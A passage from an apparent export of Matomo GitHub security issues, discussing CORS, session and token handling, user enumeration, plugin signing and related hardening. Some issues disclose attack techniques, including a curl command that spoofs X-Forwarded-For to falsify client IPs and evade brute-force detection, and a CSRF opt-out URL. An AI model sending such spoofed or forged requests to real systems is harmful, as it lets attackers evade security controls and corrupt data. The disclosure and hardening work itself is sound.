","Looks like you have some changes here from other merged PRs@justinvelluppillai fixed :)@peterhashair I'm not very familiar with the CORS stuff, but based on the documentation your PR can't work, as the origin only allows one record to be returned. See https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin
> `<origin>`
> Specifies an origin. Only a single origin can be specified. If the server supports clients from multiple origins, it must return the origin for the specific client making the request.@sgiehl I got an idea not sure if I am correct, I move the Corshandler to the Tracker main, works on my local, but I update Corshandler a little, will that cause any issues?@peterhashair I actually wasn't aware of the CORSHandler. Maybe it would make more sense to move the preflight handling completely to the CORSHandler.We are also setting cors headers here: https://github.com/matomo-org/matomo/blob/4.x-dev/core/Tracker/Response.php#L111, it might be a good idea to merge this also with CORSHandler
@sgiehl @MichaelRoosz rewrite `CORSHandler`a little bit hopefully that makes more sense.@sgiehl trying to think of a test, is there a function I can use to do a fake cors request?@peterhashair I guess you could use `Http::sendHttpRequestBy` to send a curl request with the according request headers. There should be flag you can set so the method also returns the returned status and headers so you are able to check if they are expected.@bx80 Trying to add below in the `setUp` to test the config, but it seems like the test config won't update config. any ideas?
```php
       $testingEnvironment->overrideConfig('General', 'cors_domains', 'https://example.com', true);
```` @peterhashair It might need to be an array value instead of a string
```php
$testingEnvironment->overrideConfig('General', 'cors_domains', ['https://example.com']);
```@bx80 the old function doesn't accept array, I extend the function, the last param `true` accept arrary@peterhashair There seem to be some other places where an array parameter is being used. https://github.com/matomo-org/matomo/blob/742071ed81919ebb745f7a735b03a84c26a83b03/plugins/CoreConsole/tests/System/ArchiveCronTest.php#L328@bx80 tried all kinds of different ways, but the config still won't set, any suggestions?@peterhashair I think the parent `IntegrationTestCase` class for the test already has a fixture defined which also it's own test environment initialized, instead of overriding the config setting on new test environment object you could try overriding the config on the parent fixture's test environment with:
```php
self::$fixture->getTestEnvironment()->overrideConfig('General', 'cors_domains', ['https://example.com']);
```@bx80 figure out why, if all the tests are passed will request a reviewThis issue is in ""needs review"" but there has been no activity for 7 days. ping @matomo-org/core-reviewers@justinvelluppillai This PR would now be ready to merge. But it actually changes more than the issue that should be solved. All the CORS handling is now also done for API requests. That means if the cors_domains config is set incorrect, the Matomo UI will no longer work correctly. The page will load, but all API requests will fail, causing only an error to show up.
Personally I think that behavior is kind of correct. But we might need to consider to either mention that in the dev change log and maybe also update or add an FAQ. This might be kind of a breaking change as it restricts API requests being sent from other sites...> That means if the cors_domains config is set incorrect, the Matomo UI will no longer work correctly. The page will load, but all API requests will fail, causing only an error to show up. ...  This might be kind of a breaking change as it restricts API requests being sent from other sites...

FYI if there's any kind of breaking change then we should wait for Matomo 5 before merging this. Or maybe we can prevent the breaking change in some way. We wouldn't want to break the UI.

Can we also confirm there's no security issue by this new implementation which is quite different (for all kind of web servers)? I've tested this locally and before I was not allowed to send a reporting API request from a different domain but now it allows me to send a request from that domain. Meaning this would be also a security regression.By sending a 401 or 403 response code can we also make sure this won't cause any duplicate requests to be sent in the JS tracker eg because of https://github.com/matomo-org/matomo/blob/4.10.1/js/piwik.js#L2843-L2850 where we send the same request again if there's eg a 4XX response. If there's any way this could happen then this will likely result in duplicate tracked data and increased server load.

I'm thinking at least for tracking API it's potentially on purpose maybe to send a 2XX response code in some cases instead of 4XX as the response may not be needed and the 2XX prevents users from thinking there is an error and then they email support or create bug reports when there's actually no problem. This may be different for the reporting API where the response is usually needed.

Also note that HTTP response codes of tracking and reporting API are API see https://developer.matomo.org/guides/apis meaning changing the response code is also in itself a breaking change.

Maybe the behaviour for tracking API should be unchanged, and / or generally the behaviour on the response code may need to be different depending on if any domains are configured or if the standard applies.

From what I can see generally even if the response code is a 2XX then it doesn't mean the response can be read, the browser would still show a CORS error so not sure how valid the context of the original issue is 
<img width=""1355"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/171986727-fb13cc39-b5ed-44ec-8702-5f254c5ba7e2.png"">
If you don't want this PR to be closed automatically in 28 days then you need to assign the label 'Do not close'.This PR was last updated more than one month ago, maybe it's time to close it. Please check if there is anything we still can do or close this PR. ping @matomo-org/core-reviewers",yes,"c: Security,not-in-changelog,Do not close,"
matomo-org/matomo,52314816,"Review how Access::doAsSuperUser is used, and see how to use it less","The goal of this issue is to investigate the use of `Access::doAsSuperUser` 

Notes from @tsteur 
- when posting events it does not even describe that the code will be run as superuser. Who knows what plugin developers do there, they can't expect something like this...
- in general we should not have to use this at all, only under very rare circumstances. It usually just that there is a problem somewhere else. In this case one could simply call the Model to get the data instead of the API and the doAsSuperUser is no longer required.
- there is also still the command thing that runs all the commands as super user
- check super user access is resetted when a wrong token auth is given
",,no,"Task,c: Security,c: Platform,"
matomo-org/matomo,622052054,"Disable adding new plugins (for security) while still checking for plugin updates","Currently users who want to secure their Matomo installation as much as possible need to follow recommendations in https://matomo.org/docs/security-how-to/

as part of this guide, it would make sense if could add one more step which would be to **Prevent Super Users from installing or activating new plugins from the Marketplace**. Without this step, any super user could install any plugin from the marketplace which wouldn't necessarily be secure. (to be very secure, one company may decide to individually review plugins before enabling them. super users shouldn't be able to install plugins from marketplace ideally).

## Current situation

1. we set `enable_plugin_upload = 0` by default which prevents new plugins from being ""uploaded"" manually, but still the marketplace can be used
2. one can disable the Marketplace plugin, but it can be re-enabled via the UI anyway so that doesn't work (and disabling marketplace means you lose the security benefits of checking for updates for existing plugins)

## Proposed solution
So ideally we need a new feature/INI setting for example: `enable_install_plugin_from_marketplace` set to `1` by default, but when set to `0` then the feature to download the code from marketplace would be disabled (with a popup explaining why and which setting to change if needed).",,no,"Enhancement,c: Security,"
matomo-org/matomo,54440826,"Consider using sha256 instead of md5 in config/manifest.inc.php","Hi

md5 is officially broken(1) and we should consider migrating to sha256 in config/manifest.inc.php 

Thanks

Links:
1. http://en.wikipedia.org/wiki/Collision_attack#cite_note-2
","Should be easy to change in Piwik itself but also requires change in other repos such as https://github.com/piwik/piwik-package/blob/master/scripts/build-package.sh#L169
@tsteur Totally agree with you, the `build-package.sh` as well as the `Makefile`. But definitely no big deal.
",no,"c: Security,"
matomo-org/matomo,567726411,"Default setSecureCookie to true","I think that [setSecureCookie](url) should be set to `true` as a default, not an option. From my point of view, serving Matomo over https should be expected - not http. An therefor it should make sense to have [setSecureCookie=true](url) as default, and if it should not be set to true, that should be the option, that makes setting up tracking much simpler for the end user, from my perspective.

So this should be the override:

`_paq.push(['setSecureCookie', false]);
`

","Thanks for your suggestion. Guess might make sense to expect secure cookies by default.
Might be something we could evaluate for Matomo 4. It kind of breaks BC, as the tracking code needs to be adjusted for HTTP sitesI think this might be even worth breaking BC for as the alternative is having everyone using HTTPS (which should be far more people than those that don't) edit their tracking code.We had this topic few days ago in slack. Problem is when your site is not fully https, and eg some pages are http and some are https then you end up with different cookies and different visitor IDs etc. 

Many people are still using http, and for example have a login on https etc. Seeing this sometimes while investigating issues. Of course they could then just remove the line from the suggested tracking code. Would need to make sure the default tracking code we suggest has a comment next to it explaining things and explains when to remove it etc. 

> serving Matomo over https should be expected -

In this case it's the user website that matters as we are setting a first party cookie unless I'm not seeing it?Assuming we make secure cookies the default setting, we could extend the tracking code generator with an additional option `My site is served https only`, which is checked by default. And when you uncheck it the `_paq.push(['setSecureCookie', false]);` is added?BTW we should maybe rather make such a change as part of Matomo 5. Because when you change this, it can cause issues when users have HTTPS and HTTP traffic as it would create different visitors depending on protocol. 

Not sure what the benefit is though. If someone only uses HTTPS (which many sites do), then this should basically not even be needed to be called as there wouldn't be much of a benefit?The idea could be that we add the paq push call to the default generated tracking code instead of changing the default value in `matomo.js`. 

This way it is a bit more likely that users will figure out why they have double visits etc.

And it's very quick to implement.

And we don't break as many installs as it would be mostly behaviour for new installs (unless someone uses the API to get the tracking code which many do)

Problem: It would currently log `Error in setSecureCookie: You cannot use `Secure` on http.` when someone is using HTTP on their site. This will create confusion, bug reports, support requests, ... We should remove this log message in that case.@Findus23 @mikkeschiren @sgiehl can someone help me what the benefit of setting the secure cookie is when the site is only served in HTTPS anyway? In that case it wouldn't be sent over HTTP anyway?

And when someone is using HTTP and HTTPS then it wouldn't be in the interest of the user to enable secureCookie as it will generate different visitor IDs on the different protocols and cause wrong numbers.> @Findus23 @mikkeschiren @sgiehl can someone help me what the benefit of setting the secure cookie is when the site is only served in HTTPS anyway? In that case it wouldn't be sent over HTTP anyway?

That's only true if HSTS is enabled (which I assume is not true for the majority of Matomo sites). Otherwise, I think there is nothing stopping an attacker from serving the site via HTTP and linking the user to it (by MITM-ing their connection).FYI It's currently active on 24% of sites https://w3techs.com/technologies/details/ce-hsts

And I believe if you are already browsing a site on HTTPS, then a browser wouldn't the HTTP request? I just tested this on my site and the browser would block the request.",no,"c: Security,"
matomo-org/matomo,603515823,"Add new feature to allow token_auth only in POST and HTTPS requests","This would better protect the token_auth and same would apply for app specific tokens and tracking requests.

It probably wouldn't apply to the temporary token_auth used in the API which is bound to a session (in Matomo 4) so features like export should still work. 

I guess limiting to HTTPS requests only would probably already work by forcing HTTPS. The improvement be basically mostly that it guarantees the token doesn't end up in access logs. ",,no,"c: Security,"
matomo-org/matomo,177146599,"path disclosure in http://demo3.piwik.org/libs/","go to http://demo3.piwik.org/libs/ in google chrome browser

path disclosure is displayed in http://demo3.piwik.org/libs/

fix : do not disclose path disclosure in browser
","reverting #10931   because on some apache servers, `Options -Indexes` does not work and create 500 error and I couldn't find a solution. It's no big deal to have path disclosure in piwik folders IMHO",no,"c: Security,"
matomo-org/matomo,374889520,"Possibility to enumerate user","In **Change your password** page, user enumeration is happening and it must change.
Simply replace the message **Error: Invalid username or e-mail address.**  Into something like **an email has been sent to the address on record**.","I don't think we consider this a security issue. We even provide API methods for users with view access to check if a specific userLogin or userEmail exists.users with view access have indeed the ability to check whether an account exists,

 but wondering about anonymous user (thanks for reporting this issue @fadi-assaad), is it currently the only place where one can check whether a given username/email account exists? 

I suppose there are couple more places... I wouldn't be surprised if `UsersManager.getTokenAuth` exposes it, and lots of other places.Hello, do you still consider user enumeration as a non-security issue? If yes, could you please take an official stance and close this issue? And if not, could you please fix it? Thank you for your answer.

FYI, [OWASP seems to consider it as security issue](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account).",no,"c: Security,c: Usability,"
matomo-org/matomo,114668125,"Send an email / text when there's a login from another country","See #9140 

We should send an email when there's a login from another country (if GeoIP is enabled). It should be optional, possibly enabled by default (users that live near a border might want to disable it).

Email could contain IP and location, maybe even user agent / device information
","great!
we should think on the definition of ""another country"":
- do we be track and store always login place for each user and compare on next login?
- do a user have to set a home country manually?
- do we make a global ""white list"" within an installation for countries being valid for all piwik users?
one could also use this to give other login behaviours depending on country matching
e.g. in foreign countries having a lager delay after false passwort etc.
I reckon it would be good to look at some other platforms and how they solve it (eg wordpress plugins etc.). Possibly we need some settings to make it maybe configurable. Without thinking too much I'd probably only store the last country. Let's maybe better send an email too often than too less. In worst case a user gets an email too much. Would also have the benefit to signal the user that the feature works :) Don't think it justifies to store a complete history / whitelist of countries for a specific user for now
Also we could send an email when there's a login from another device / browser. We could generate a `configId` based on some browser data or set a cookie to identify a device and if one ever logs in from another device we send an email once. This might be rather related to 2 factory authentication (https://github.com/piwik/piwik/issues/2846) though
If text messages are configured in a Piwik (eg for scheduled reports) one should ideally also be able to receive it as a text message on your phone to be able to react quickly in case it wasn't you who logged in...
""Also we could send an email when there's a login from another device / browser.""
and
""one should ideally also be able to receive it as a text message on your phone""
**sounds perfect!**
An idea what data to be included in email:

**1) Reason for this mail:**
There was a login from another country than last time

**2) Full description of the account one is talking about:**
Username
Alias
Email

**3) Details of finding:**
Country of Login last time
Country of Login this time

**4) What to do now?**
If you are the one who logs-in  in a different country you can delete this mail.
If you aren't the one: Please contact your admin as fast as possible.

Maybe on should ad the email-adress of an admin for direct contact?
without a user may have no information who it is
Maybe email should not only be send to user but also to admin?
I wouldn't go that far and send it to the admin as well. It should be enough to send it to the user. 

If we have an ""Activity log"" page one day we could maybe allow a super user to see all activites of all users (such as when did a user login / logout, it shows time of creating/updating websites, users, ... etc) and maybe also add it to the Custom Alerts feature but this is a different topic :) 
+1",no,"c: Security,c: New plugin,"
matomo-org/matomo,547775922,"Provide ability to restrict auth tokens to site, access, scope","In https://github.com/matomo-org/matomo/issues/6559

I am starting to implement app specific authtokens/passwords. 

I started adding some additional features to further increase the security of tokens:

* Scope: Let users choose if token should be valid for `Reporting API`, and/or `Tracking API`, `Widgets`
* Access: I was going to let users choose what access the token should have. Eg an admin user could decide the token should have only `view` or `write` or `admin` access (but not super user)
* Sites: I was going to let the user choose whether the token should have access to all sites, or only one site.

Of course this way you could create different combination of tokens to lower the risk a lot, eg
* A write token for the tracking API that has only access to one site
* A reporting token with view permission for only a specific site even though the user is super user or write user or admin user
* A token for the exported widgets with only view access which has only access for one site

This way, even if a tracker gets the token, the scope of what they can do is quite restricted. 

It's tricky to implement though. Eg likely we would need to use completely different `Access` class depending on whether user is authenticated through UI, or through token_auth. It me mostly done though by changing maybe the behaviour of `Access:loadSitesIfNeeded` but not sure. Also we would need to check in various places eg in `API::index()` whether the token is allowed for the current scope etc.

Figured I create separate issue for now to simplify #6559.",,no,"Enhancement,c: Security,"
matomo-org/matomo,37353596,"config: add ""salt"" section for multiple salt values","WordPress has multiple salts.  Each salt is used for different scopes/situations.

Per #308
- superuser->salt will be used exclusively for the superuser's password hash
- the password table would have a new salt column, i.e., salt per user

A new [salt] section would initially contain salts for these scopes:
- cookie
- nonce
- cache-buster
- archive-lock

Modify:  Piwik_Common::getSalt(string $scope)
","Security now has its own sub-category since they're ""special"" items!
",no,"Task,c: Security,"
matomo-org/matomo,91399306,"default config: api_service_url to use https","Current download of piwik 13.x comes along with global.ini.php including

```
api_service_url = http://api.piwik.org
```

This should be changed to https asap, because MITM could compromise the api output otherwise (keep in mind that the output is presented to user including links, update information etc.)

This issue (#1867) has already been discussed 5 years ago. Now that https-api is available for a long time you should default to it. We have 2015 now and attackers use every possibility they can find.

Via MITM, tt potentionally compromises all the nice automatic update, can be used for phishing attacks, ...

Users should be recommended to use https if they have overridden the global.ini.php default.
",,no,"c: Security,"
matomo-org/matomo,803048581,"Matomo can be tricked to record spoofed X-Forwarded-For IPs","## Problem

Considering the current implementation: https://github.com/matomo-org/matomo/blob/a31fd86b64c2c7d2deadcfca71540fb4b0152c10/core/IP.php#L99-L125

With the following setup:

```
[client] -> [reverse proxy 1] -> [reverse proxy 2] -> [matomo Nginx]
```

Since each proxy appends the IP of the incoming connection according to [RFC7239](https://tools.ietf.org/html/rfc7239), `X-Forwarded-For` will be this by the time the connection reaches Nginx (1):

```
X-Forwarded-For: (client), (proxy 1)
```

Matomo currently extracts the first IP from the list, since #10404. This is correct until you realized the ""client"" can pretended to be a proxy as well, by including its own `X-Forwarded-For` header, like this:

```shell
curl -i -H""X-Forwarded-For: 8.8.8.8"" ""http://example.com/matomo/matomo.php?...""
```

When this happens, proxy 1 will be faithfully preserve the header passed in and append the client IP after it (2):

```
X-Forwarded-For: 8.8.8.8, (client), (proxy 1)
```

And Matomo will extract `8.8.8.8` as the client IP.

## Solutions

### Solution 1: Trust the ""transparent proxies""

If Matomo decided the first ""client"" IP can always be trusted, we can still extract the first IP address, and this issue can be closed as ""works as intended."" But it will in risk of having the analytics data being polluted. **Brutal force login detection can be tricked too.**

### Solution 2: Extract the last IP address

This would involve reverting #10404 and go back to extract the last IP address. Since the original `proxy_ips[]` configuration is still intact, when facing a header like (2), above, a correctly configured Matomo will be able to exclude the ""proxy 1"" IP address.

## Notes

* There can be a solution 1.1 where Mamoto will rely on proxy 1 (the first public-facing proxy) to remove the spoofed header. However this is not always possible (not possible for Apache AFAIK)
* It is unclear to me what other client IP headers (`HTTP_CF_CONNECTING_IP`, `HTTP_CLIENT_IP`, etc) behaves and if Matomo have to do things differently between these and the `X-Forwarded-For` header.
* #7060 is a staled discussion related to this, but the discussion talks about the header processing in the context before #10342.
* #16379 have since promoted `proxy_ips[]` pretty well in the documentation. We may consider doubling down on the documentation effort when we pick either solution for this issue.
* Lastly, one tiny nitpick: #10404 updated the name of the function `IP::getFirstIpFromList` but it didn't change the word ""last"" in the function comment right above it :)

Thanks!","Hi @timdream, thanks for creating this issue. Is this behavior in Matomo causing a problem for you specifically? Do you know of a client that does this and is causing a problem?@diosmosis It did not cause a problem for me! I am just trying to document what I've found that may be problematic in terms of spoofing and attack vector. I did not spot such attack/spoofing taking place on my own instance.Thanks @timdream would this be kind of a duplicate or related to https://github.com/matomo-org/matomo/issues/7060 ?@tsteur Yes the issue is related (see note), but I wouldn't say it is a duplicate because the research I made here contains new information on the current implementation.> There can be a solution 1.1 where Mamoto will rely on proxy 1 (the first public-facing proxy) to remove the spoofed header. However this is not always possible (not possible for Apache AFAIK)

that was my first thought would be the preferred solution as AFAIK in https://github.com/matomo-org/matomo/pull/10404 it says 

> The RFC at https://tools.ietf.org/html/rfc7239 makes it clear that we should extract the first IP from the header HTTP_X_FORWARDED_FOR

So changing it to last IP could potentially break things again etc. 

Another workaround might be to use other headers depending on what can be configured that can only be set by the public facing proxy? I don't know if that's the same problem for Apache.

Mostly seeing this so far as a documentation issue to mention it in the docs for setting up the proxy if it's not mentioned yet.BTW if you have a WAF then you may be able to configure to block any request having a `X_FORWARDED_FOR` request set.We are adding a new config setting for this in https://github.com/matomo-org/matomo/pull/17765

Maybe in Matomo 5 we make it default to read the last entry. However, depending on the setup the last IP might be an internal IP and it could break things.

To be evaluated with Matomo 5 whether we'll change the default.> BTW if you have a WAF then you may be able to configure to block any request having a `X_FORWARDED_FOR` request set.

You are definitely on to something.   AFAIK is it more or less best practice to replace the XFF(X-Forwarded-For) header on all traffic passing the first proxy that handles incoming traffic, with the real client source IP. Since you can never trust a client. 
But this is not up to the application to deal with IMO.

If the XFF header is present, and the ""proxy_client_headers[] = HTTP_X_FORWARDED_FOR"" is set, 
the application must be able to trust the chain of IP's. And use the **first** as client.
We have prepared this feature in https://github.com/matomo-org/matomo/pull/17765/files

Ideally we enable this security feature by default to have the IP detection more secure (`[General] proxy_ip_read_last_in_list=1`). 

Then we update the guide in https://matomo.org/faq/how-to-install/faq_98/ to mention people may need to disable this feature if the first IP should be used.Will need to be communicated in the developer changelog as well. ",no,"c: Security,"
matomo-org/matomo,44244330,"When creating a new user, the password should not be visible, but stars","Seen on Piwk.pro (Piwik 2.6.1.)

![2014-09-28_piwik_password_field](https://cloud.githubusercontent.com/assets/1004261/4436001/57540aa2-4761-11e4-8840-b52a09d5a452.png)

Thanks!
","Thanks for the suggestion!

Maybe we could also add a checkbox ""Show password"" 
",no,"Enhancement,c: Security,"
matomo-org/matomo,37354979,"Fix inconsistent sanitization: sanitize on output rather than input","The way in which Piwik deals w/ sanitizing user data is inconsistent: it is sometimes done on **input** (data is stored sanitized), sometimes on **output** (less frequently). For example, website names are stored in the DB sanitized and need to be unsanitized or outputted raw in HTML. Goal names are not sanitized in the DB and need to be escaped when outputting in HTML.

This should be made consistent. Additionally, [security best practices recommend](http://blog.ircmaxell.com/2011/03/what-is-security-web-application.html):
- filter on input (e.g. cast to an integer if you expect an integer, but don't sanitize strings)
- escape on **output**

Problems with the current approach:
- escaping on input is done for HTML/XML: that escaping doesn't makes sense for SQL, JavaScript/JSON, … And it needs to be undone for those cases
- double escaping issues if we escape on output (e.g. Twig and Angular do that by default)
  - #8496, #8123, #7987, #7969, #7806, #7531, #7528, #6821, #6722, #6325, #6068, #5189, #5009, #4749, #4709, #4231, #3954, #3549, #3503, #2519, #2400, #2386, #974, #341
- strings are stored in database escaped (not as their ""real"" values)

We should try to slowly move to sanitizing on output using native escaping features of Twig or AngularJS for example.
","- Search for`
  {{ siteName| }}` 
  - SMS report encoding
  - All consumers of websiteName

Besides Website names, what are the other entities which are stored sanitized? 

I expect maybe that many entities will store as sanitize. Fixing this has some risks for XSS we have to careful. 
- Also maybe we can remove the makeXssContent() used in tests and make the behavior consistent (ie. sanitize whether we call the API directly in PHP, or via HTTP, or whether we use API\Request object).
@matt If makeXssContent is removed, how do we test for XSS?
I didn't mean to remove the xss test itself but rather I was noting that there is also an inconsistency in the way APIs inputs are (or not) sanitized. 
Maybe this is out of scope for this ticket though.
Note: there is another inconsistent sanitization policy in Piwik, see below function:

```
    /**
     * This function will sanitize or not if it's needed for the specified action type
     *
     * URLs (Page URLs, Downloads, Outlinks) are stored raw (unsanitized)
     * while other action types are stored Sanitized
     *
     * @param $actionType
     * @param $actionString
     * @return string
     */
    private static function normaliseActionString($actionType, $actionString)
```

and: `Action::isActionTypeStoredSanitized`
#6714 has been merged into this issue
@mattab hi, as this problem is open for a long time and commonly suffered, when do you plan to fix it?Due to the complexity of this task and the high risk of introducing security regressions (in particular, XSS), so far we have not been able to work / schedule this project. I would suspect it will take a long time before we can tackle this fully, and likely it will be done step by step over time, plugin by plugin etc. Any contribution will be very welcome",no,"Task,c: Security,"
matomo-org/matomo,1373680428,"Outbound API/Plugin URL using HTTP instead of HTTPS can cause application blocking","We have a Matomo user that has configured their servers to block outbound requests that are sent over port 80 because they want to completely prevent insecure connections from being made.

When this port is blocked, several issues occur:
1. The Matomo application in certain places in the UI are effectively blocking the UI from loading or responding while Matomo attempts to make a connection to the outbound server. 
2. The connection to the external hostname eventually fails which results in plugin update checks for example to fail.

I found one example of where the HTTP hostname is defined instead of the HTTPS hostname:
https://github.com/matomo-org/matomo/blob/4.x-dev/plugins/Marketplace/config/config.php#L9

Potential solutions:
- I guess the simplest would be to just change the hostnames for outbound connections to HTTPS, but this might break things for some servers that have outdated certificate bundles.
- It would be great if we could use the HTTPS hostname by default and if that fails maybe try the HTTP hostname

But in either case, the timeout seems quite high for a failed connection at 60 seconds, which means that each time that page or a page that checks an external hostname is accessed, the Matomo UI would take a minimum of 1 minute to load. It would be good if this timeout was reduced to at least not block the page from loading for such a long time.","We have completed https://github.com/matomo-org/matomo/issues/19081 recently, and will soon make these requests use https by default.Thanks for the update @justinvelluppillai 
Is there an existing issue for changing the URLs/hostnames to use HTTPS? If so we can close this one and rather track it there?We don't have a public facing issue for this yet so this one can remain open 👍🏽 Hi, just wanting to throw in that the change here (https://github.com/matomo-org/matomo/blob/4.x-dev/plugins/Marketplace/config/config.php#L9) did in fact break my installation so that every request took more than 1 minute because of the long timeout defined in the marketplace plugin.

The server is only allowed to make outbound connections for https (TCP 443) and not http (TCP 80). I had to shut down the internet features via `enable_internet_features=0` to see what's going on after what appeared to be a minor update (4.10.1 -> 4.12.0.

I would've liked to see that change in the changelog of 4.11 instead of only ""a new config setting `force_matomo_http_request`"" which is irrelevant to me. I now have to edit the `plugins/Marketplace/config/config.php` file to rewrite the URL to `https` because there seems to be no config option to override it (like `api_service_url`).

I only found out that the marketplace is not using https after dumping the URL in its service, maybe this could somehow be marked in the system diagnostics check with the curl-error if `http://plugins.matomo.org` is not reachable if the marketplace plugin is active.",no,"c: Security,"
matomo-org/matomo,1331289122,"Anonymous user access doesn't send any security alerts or require password verification","There is currently no security alert sent when the anonymous user is enabled for a Matomo instance. It also doesn't require a password for verification.

This means that any user that can set access for user accounts for a site/measurable could enable it without properly reading the warning and allow public access to their reports.

It would be good from a security perspective to do the following:
1. Send an email alert to all super users that the anonymous user has been given access to site(s)
2. Require password verification (There is already a popup, but this can be clicked without needing a password)
3. Potentially send an email notification once a week/month to super users as a scheduled task so that they are reminded that their reports are publicly accessible.
This would be useful for people who already have the anonymous user active and wouldn't have got the security alert.","Would you mind defining what the expected behavior should be when selecting multiple users (including anonymous) in the list and giving all `view` access at once? Currently not even the additional access warning is shown in that case.FYI it's actually too easy to give an anonymous user view access by accident. Especially using the multi select. Maybe an anonymous user cannot be enabled in the UI along with other users in the future?

And/or maybe ideally the `anonymous` user wouldn't appear in the users list until specifically enabled to appear there. We could always show eg this menu item:

<img width=""549"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/184553111-9f685936-8952-4134-b157-05dc7ebdf833.png"">

and have a setting to enable/disable the anonymous user setting feature (just a random example).
<img width=""1279"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/184553332-1de9f682-9e77-4f1a-93d6-3863d84aa9dc.png"">

Just few ideas.",no,"c: Security,"
matomo-org/matomo,111946336,"CSRF in user tracking","1) In piwik, admin can provide tracking optout option for users using iframe ""http://demo.piwik.org/index.php?module=CoreAdminHome&action=optOut&language=en""
2) If suppose attacker embeds the url and makes the user to execute the url ""http://demo.piwik.org/index.php?module=CoreAdminHome&action=optOut&language=en&setCookieInNewWindow=1&showConfirmOnly=1"", they will be tracked out from piwik analytics without their knowledge

Regards
Elamaran V
elamaran619@gmail.com
","Thanks for the report @UnlockPrice !
",no,"c: Security,"
matomo-org/matomo,59207996,"Add a timeout for auto-logoff","I noticed i stay logged in infinitely.
Shouldn't there be a timeout on inactivity?
Maybe with an option to change the time and/or to disable it?
","If you click ""Remember me"" then you will be logged in forever. I think it's by design. Maybe we could expire it after N days of inactivity... ?
@mattab Yes, it would be better to expire user session after N days of inactivity because there is no point in keeping the user session live forever if there is no user activity in the given browser tab. We need to make the user log into the site every 3 or 5 days to make sure that the user's data is not abused by others using the same computer or device. Which would be fine, 3 or 5?
When is issue resolve?
I need, that piwik web interface users autologout through N times.
When the auto logoff can be resolved?
",no,"Enhancement,c: Security,"
matomo-org/matomo,457917597,"Add 'This wasn't me' to reset password E-Mail","Hey, I thought of an option where you can click a link ""This wasn't me"" in the E-Mail which you get if someone tries to reset your password.
The IP of the attacker could be saved in the bruteforce table and be banned for the amount of time set globally in bruteforce settings.

If you can name me the files where I can see how an IP gets banned, I can also code this function myself.
Although im probably not able to code the E-Mail link.",,no,"c: Security,"
matomo-org/matomo,247269626,"Add code signing to the Piwik Plugin upgrade process","Recently I have been looking into the security implications of automatically upgrading Piwik and whilst the Piwik Core is verified using a GPG key, the plugins get no such verification. As a result, an malicious party gaining access to the plugin server could replace latest plugin versions with malicious version with no verification.

The inclusions of libsodium in PHP 7.2 makes this easier. And there are pure-PHP libraries that are supported back to PHP 5. A similar issue was raised for [WordPress](https://core.trac.wordpress.org/ticket/39309), however it was postponed due to other priorities.

My understanding is that Piwik already implements auto-updates for it's plugins and as such any attack on the Piwik plugin infrastructure could potentially expose a large number of systems to malicious code.

There is a respectable guide(also linked in that WordPress issue) [here](https://paragonie.com/blog/2016/10/guide-automatic-security-updates-for-php-developers) on implementing upgrades for PHP.","Thanks for the suggestion. Yes, it would be great to implement the code signing verification mechanism when downloading plugins from the Marketplace. And we also should implement this code signing mechanism when downloading the Piwik core platform via the auto-update mechanism. 

Note: currently, the code signing is not checked, we only download the upgrade over HTTPS. Code signing procedure has to be done manually by the users who know about it. We would like to implement this as part of https://github.com/piwik/piwik/issues/7328 
We also should surface the manual code signing instructions better, see https://github.com/piwik/piwik/issues/10687",no,"c: Security,"
matomo-org/matomo,181091470,"Add instructions on the Download Page : ""How to verify PGP/GPG signature""","Hello,
I suggest you to add more details and instructions for verify PGP/GPG signature on the download page,
_( Suggested in #1757 )_
Maybe just the link to your blog will be enough : 
[How to verify signatures for Piwik release packages](http://piwik.org/blog/2014/11/verify-signatures-piwik-packages/) (Lot of details and well documented).

Thanks,
",,no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,59736580,"Never send token_auth as GET parameter, but send it as POST instead","The goal of this issue is to ensure that in Piwik core, including the `core:archive` cron task and other logic, we will not send the `token_auth` as a GET parameter. Instead we should send with POST  the `token_auth` so that it does not show up in logs and whenever the GET URL is output.

This follows up #5277 and  #7301

Also related to #4171
","Note: this is already done for Ajax requests done in the UI, was done in #3359
Note that we can also use HTTP headers to pass the token. I don't know if there's any reason to prefer one method to the other though.
After having a look, we have for example Amazon and GitHub that use the official `Authorization` HTTP header. That's probably a good example to follow.

One advantage I see with this is that you are not forced to use POST requests: you can keep using GET, but also any other HTTP method. So this would be necessary if we ever want to do REST, so I think using headers is better because it would be forward compatible.
> One advantage I see with this is that you are not forced to use POST requests: you can keep using GET

quick note: the change in this issue would not force to use POST or GET, as already Piwik API will work when called on POST or GET (either will work). currently ajax requests in the UI use POST (to hide the token_auth) and core:archive command use GET. 
It would ""force"" to use POST if you want to keep the token secure though.
To clarify: this issue is only about controlling within the Piwik
platform itself that we don't use token_auth as GET.

In general, we cannot force to use POST since already thousands of users
use GET when talking to their Piwik API and we could not break it for
them - even for 3.0.0 or other major versions
Yes the GET method with URL parameter would still work in any case.

> To clarify: this issue is only about controlling within the Piwik platform itself that we don't use token_auth as GET.

I understand but I don't see how it affects POST vs headers. We could change all requests in Piwik itself to use POST, but we could also change them to use headers for the token (and add support for that in the API). I believe going the ""headers"" way is better because it would allow us to move more easily towards rest.

If we just do POST instead of GET everywhere inside Piwik, that's going the opposite way of rest. E.g. using POST to get information doesn't make sense in HTTP.
> If we just do POST instead of GET everywhere inside Piwik, that's going the opposite way of rest. E.g. using POST to get information doesn't make sense in HTTP.

Ok I now understand your point, that we should not use POST because it's not the way of rest. +1 for that and for `Authorization` header then :+1: 
@mattab could you clarify if this affects using widgets? It seems only anonymous access would keep widgets useful as otherwise widgets would require including the token in the URL exposing it (in code, logs, etc.). Correct me if I am wrong.
Looking through my access_log recently reminded me of [a comment](https://github.com/matomo-org/matomo/issues/14099#issuecomment-463455324) @tsteur made in #14099:
> BTW: You want to send those requests through POST request otherwise you may have eg the token_auth from the request in web server log files

I just noticed the token_auth is shown in access_logs anytime the [PHP Tracking Web API client (Method 2: HTTP Request)](https://matomo.org/docs/tracking-api/#piwik-tracking-api-advanced-users) is used. For example, I see a bunch of these in my access_log:

